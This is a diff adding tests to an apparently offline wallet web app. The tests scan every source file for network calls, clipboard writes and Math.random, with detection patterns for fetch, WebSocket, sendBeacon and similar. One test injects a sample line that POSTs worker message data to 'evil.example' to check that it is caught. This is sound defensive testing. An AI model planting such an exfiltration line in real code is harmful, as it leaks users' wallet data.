@@ -175,6 +175,140 @@ test("the app never fetches, so the CSP forbids connections", () => {
   assert.doesNotMatch(read("src/js/online.js") + read("src/js/network-check.js") + read("src/js/browser-check.js"), /\bfetch\s*\(/);
 });
 
+// Deliberately no comment stripping: a regex literal such as `const s = /\/*/;`
+// can look like the start of a block comment and hide the rest of the file,
+// and a line of a multi-line template literal that begins with `//` still runs
+// its ${...} substitutions. Any stripper short of a real tokenizer can be
+// fooled, so these scans read the raw text; a comment that names a forbidden
+// API must be reworded. Only the four generated WASM embeds (wasmModulePaths,
+// by exact path) are skipped; any other script (.js, .mjs or .cjs), whatever
+// its name, is scanned. The walk covers all of src, not only src/js, so
+// src/service-worker.js is scanned too: the page's CSP does not govern a
+// worker's own requests.
+const isScannedSource = (rel) => /\.[cm]?js$/.test(rel) && !wasmModulePaths.includes(rel);
+const jsSourceFiles = () => {
+  const files = [];
+  const walk = (dir) => {
+    for (const entry of readdirSync(dir, { withFileTypes: true })) {
+      const path = join(dir, entry.name);
+      const rel = relative(root, path).split("\\").join("/");
+      if (entry.isDirectory()) walk(path);
+      else if (isScannedSource(rel)) files.push(rel);
+    }
+  };
+  walk(join(root, "src"));
+  return files.sort();
+};
+
+// Constructors and functions are matched by name, not by the `new X` or `X.y`
+// spelling, so `new globalThis.WebSocket(...)`, `fetch?.(...)`,
+// `navigator?.clipboard`, `Math?.random()` and string-literal bracket access
+// (`globalThis["fetch"]`, `navigator["clipboard"]`, `Math["random"]`) are caught
+// as well. A name assembled at run time ("fe" + "tch") cannot be caught by a
+// text scan; the page's CSP (connect-src 'none') and code review cover that.
+// The CSP covers the page, not the service worker, whose own requests follow
+// the worker script's response headers (GitHub Pages sends none); the worker
+// is held to its one exempt precache fetch line instead (workerNetworkText).
+const networkApiPattern = /\bfetch\s*(?:\?\.\s*)?\(|\bXMLHttpRequest\b|\bWebSocket\b|\bRTCPeerConnection\b|\bsendBeacon\b|\bWebTransport\b|\bEventSource\b|\bimportScripts\s*(?:\?\.\s*)?\(|\[\s*["'`](?:fetch|importScripts)["'`]\s*\]/;
+const clipboardWritePattern = /navigator\s*\??\.\s*clipboard|\[\s*["'`]clipboard["'`]\s*\]|\bClipboardItem\b|execCommand\s*\(\s*["'`](copy|cut)["'`]/i;
+const mathRandomPattern = /\bMath\s*(?:\??\.\s*random\b|(?:\?\.)?\s*\[\s*["'`]random["'`]\s*\])/;
+
+// The service worker legitimately makes exactly one request: the precache
+// fetch in its install listener, for the two fixed same-origin documents.
+// That one exact line is exempt; any other network token anywhere in the
+// worker fails the scan.
+const workerFetchExemption = "const response = await fetch(request);";
+const workerNetworkText = (text) => {
+  const lines = text.split("\n");
+  const found = lines.filter((line) => line.trim() === workerFetchExemption).length;
+  assert.equal(found, 1, `src/service-worker.js must keep exactly one "${workerFetchExemption}" line, found ${found}`);
+  lines.splice(lines.findIndex((line) => line.trim() === workerFetchExemption), 1);
+  return lines.join("\n");
+};
+
+test("the source scan covers every JavaScript file", () => {
+  const files = jsSourceFiles();
+  assert.ok(files.length > 50, `expected more than 50 JavaScript files under src, found ${files.length}`);
+  for (const skipped of wasmModulePaths) assert.ok(existsSync(join(root, skipped)), `${skipped} is skipped by the scan but missing`);
+  assert.ok(files.includes("src/js/clipboard.js") && files.includes("src/js/app-paste.js"), "the scan must read clipboard.js and app-paste.js");
+  // The worker ships with the site and runs on the wallet origin, and the
+  // page's CSP does not govern its requests, so the scan must read it.
+  assert.ok(files.includes("src/service-worker.js"), "the scan must read src/service-worker.js");
+  // The walk itself, not only the predicate: a real file one folder down must be in the list.
+  assert.ok(files.includes("src/js/anti-exfil-adapters/jade.js"), "the scan must reach files in subfolders of src/js");
+  // Only the exact generated paths are exempt, never a name that merely ends like one.
+  assert.equal(isScannedSource("src/js/psbt-wasm-b64.js"), false, "a generated WASM embed is skipped");
+  assert.equal(isScannedSource("src/js/net-wasm-b64.js"), true, "a new file named like an embed is scanned");
+  assert.equal(isScannedSource("src/js/anti-exfil-adapters/adapter-wasm-b64.js"), true, "a nested file named like an embed is scanned");
+  assert.equal(isScannedSource("src/js/helper.mjs"), true, "an .mjs module is scanned");
+  assert.equal(isScannedSource("src/js/helper.cjs"), true, "a .cjs module is scanned");
+  assert.equal(isScannedSource("src/js/notes.md"), false, "a non-script file is not");
+});
+
+test("the source-invariant patterns catch qualified and optional-chaining forms", () => {
+  assert.match('new globalThis.WebSocket("wss://example.test")', networkApiPattern);
+  assert.match('new window.EventSource("/events")', networkApiPattern);
+  assert.match('fetch?.("x")', networkApiPattern);
+  assert.match("navigator?.clipboard?.writeText(text)", clipboardWritePattern);
+  assert.match("Math?.random()", mathRandomPattern);
+  assert.match('globalThis["fetch"]("/endpoint")', networkApiPattern);
+  assert.match('navigator["clipboard"].writeText(text)', clipboardWritePattern);
+  assert.match('Math["random"]()', mathRandomPattern);
+  assert.doesNotMatch("globalThis.navigator?.mediaDevices", clipboardWritePattern);
+});
+
+test("the service-worker exemption admits only its one precache fetch", () => {
+  const worker = read("src/service-worker.js");
+  assert.doesNotMatch(workerNetworkText(worker), networkApiPattern, "the real worker must have no network token beyond its precache fetch");
+  const injected = `${worker}\nself.addEventListener("message", (e) => fetch("https://evil.example/", { method: "POST", body: e.data }));\n`;
+  assert.match(workerNetworkText(injected), networkApiPattern, "a fetch added to the worker must be caught");
+  const doubled = worker.replace(workerFetchExemption, `${workerFetchExemption}\n      ${workerFetchExemption}`);
+  assert.throws(() => workerNetworkText(doubled), /exactly one/);
+});
+
+test("no source file opens a network connection", () => {
+  for (const path of jsSourceFiles()) {
+    const text = path === "src/service-worker.js" ? workerNetworkText(read(path)) : read(path);
+    assert.doesNotMatch(
+      text,
+      networkApiPattern,
+      `${path} opens a network connection; if the match is only a comment, reword the comment`,
+    );
+  }
+});
+
+test("only src/js/clipboard.js writes the system clipboard", () => {
+  const exempt = "// It never reads the system clipboard (no navigator.clipboard.readText, no";
+  for (const path of jsSourceFiles()) {
+    const text = read(path);
+    if (path === "src/js/clipboard.js") {
+      assert.match(text, /navigator\.clipboard/, "src/js/clipboard.js must remain the one clipboard writer");
+      continue;
+    }
+    const lines = text.split("\n");
+    if (path === "src/js/app-paste.js") {
+      const at = lines.findIndex((line) => line.trim() === exempt);
+      assert.notEqual(at, -1, "src/js/app-paste.js must keep its exact clipboard-read exemption line");
+      lines.splice(at, 1);
+    }
+    assert.doesNotMatch(
+      lines.join("\n"),
+      clipboardWritePattern,
+      `${path} writes the system clipboard; only src/js/clipboard.js may`,
+    );
+  }
+});
+
+test("no source file uses Math.random", () => {
+  for (const path of jsSourceFiles()) {
+    assert.doesNotMatch(
+      read(path),
+      mathRandomPattern,
+      `${path} uses Math.random; randomness must come from crypto.getRandomValues`,
+    );
+  }
+});
+
 test("the WASM boot chain has a failure path that kills the page", () => {
   const app = read("src/js/app.js");
   assert.match(
